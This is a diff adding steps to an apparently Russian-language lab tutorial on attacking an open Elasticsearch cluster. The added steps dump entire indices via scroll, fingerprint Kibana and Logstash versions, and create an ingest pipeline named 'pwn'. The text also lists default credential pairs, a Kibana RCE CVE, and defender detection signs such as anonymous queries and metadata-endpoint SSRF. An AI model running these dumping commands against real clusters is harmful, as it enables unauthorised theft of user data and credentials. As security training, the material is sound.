@@ -171,6 +171,87 @@ green open sessions 2310 0.9mb
 
 Логи в Elasticsearch часто содержат токены и куки — их дамп бывает ценнее самой базы. Разбор SSRF — в ветке `web-ssrf`.
 
+## Шаг 7: выгружаем больше 10 000 документов (scroll)
+
+Обычный `_search` отдаёт максимум `index.max_result_window` (по умолчанию 10 000) документов. Чтобы
+выгрузить весь индекс, используют **scroll** — курсор, который отдаёт данные порциями:
+
+```bash
+# открыть курсор (хранить контекст 1 минуту)
+$ curl -s 'http://shop.local:9200/users/_search?scroll=1m&size=1000' -H 'Content-Type: application/json' \
+>   -d '{"query":{"match_all":{}}}' | jq -r '._scroll_id'
+DXF1ZXJ5QW5kRmV0Y2g...
+
+# тянуть следующую порцию, пока hits не пусты
+$ curl -s 'http://shop.local:9200/_search/scroll' -H 'Content-Type: application/json' \
+>   -d '{"scroll":"1m","scroll_id":"DXF1ZXJ5QW5kRmV0Y2g..."}'
+```
+
+Скролл отдаёт `_scroll_id` в каждом ответе — его подставляют в следующий запрос. Когда `hits.hits`
+пуст, выгрузка закончена. Альтернатива на 7.x+ — `search_after` с сортировкой по `_id`.
+
+## Шаг 8: Kibana и Logstash рядом
+
+Elasticsearch редко стоит один: обычно рядом **Kibana** (веб-морда, 5601) и **Logstash** (приём
+логов). У каждого свой порт и свои CVE, поэтому проверяй их отдельно:
+
+```bash
+$ curl -s http://shop.local:5601/api/status | jq -r '.version.number, .status.overall.level'
+6.5.0
+available
+$ curl -s http://shop.local:9600/ | jq -r '.version'
+7.10.2
+```
+
+Порт 9600 — это Logstash API. Kibana 6.5.0 уязвима к CVE-2019-7609 (Timelion → RCE в Node.js). Kibana
+часто хранит в своих индексах (`.kibana`) сохранённые поиски с секретами, а её `_search` тоже доступен
+анонимно при выключенном security.
+
+## Как это видят защитники
+
+Открытый Elasticsearch — классический источник утечек, и защита ищет именно признаки анонимного
+доступа:
+
+- **запросы к `_cat/*`, `_nodes`, `_search` без заголовка `Authorization`** — анонимное чтение;
+- **`_scripts`/ingest-пайплайны** с painless — попытка исполнения кода;
+- **Groovy** в теле запроса (`script_fields`) — эксплуатация старых CVE;
+- **`169.254.169.254`** в SSRF-цепочке — кража облачных кредов через кластер.
+
+Базовый hardening: включить `xpack.security`, слушать только `localhost`, убрать дефолтные пары
+(`elastic:changeme`) и не хранить в индексах токены/пароли в открытом виде.
+
+## Шаг 9: ingest-пайплайн как канал исполнения
+
+Ingest-пайплайны применяют painless-скрипт к каждому входящему документу. Если у нас есть право
+создавать пайплайны, код исполняется автоматически при следующей индексации:
+
+```bash
+$ curl -s -X PUT 'http://shop.local:9200/_ingest/pipeline/pwn' -H 'Content-Type: application/json' -d '{
+>   "processors": [{"script": {"lang": "painless", "source": "ctx.x = 1+1"}}]}'
+{"acknowledged":true}
+```
+
+Это не RCE сам по себе (painless — песочница), но полезно для проверки, что скрипты вообще включены
+(`script.allowed_types`). Если разрешён не только `inline`, но и другие контексты — на старых сборках
+открывается путь к более серьёзным последствиям.
+
+## Практика дампа без jq
+
+Иногда `jq` на цели нет, и выгружать приходится «на глаз». Тогда полезен `_source`-фильтр и
+постраничный вывод:
+
+```bash
+$ curl -s 'http://shop.local:9200/users/_search?size=2&_source=username,role&pretty'
+{
+  "hits" : { "hits" : [
+    { "_source" : { "username" : "admin", "role" : "admin" } },
+    { "_source" : { "username" : "root", "role" : "admin" } }
+  ]}
+}
+```
+
+`_source=username,role` возвращает только нужные поля — меньше шума и меньше данных в ответе.
+
 ## Что мы теперь знаем
 
 - Elasticsearch говорит по HTTP/JSON на 9200; `tagline` и `cluster_name` — его признаки.
@@ -187,6 +268,7 @@ green open sessions 2310 0.9mb
 - **9200 ≠ 9300.** 9300 — бинарный transport, `curl` там бесполезен.
 - **Дефолтные пары.** `elastic:changeme`, `kibana:kibana`, `logstash:changeme` меняют не всегда.
 - **Разрушительное — с согласия.** `DELETE /index`, `_delete_by_query` стирают данные; не выполняй без разрешения.
+- **Scroll для объёма.** Больше 10 000 документов выгружают через `scroll`/`search_after`, а не `size`: обычный `_search` молча обрежет выдачу.
 
 ## Квиз
 
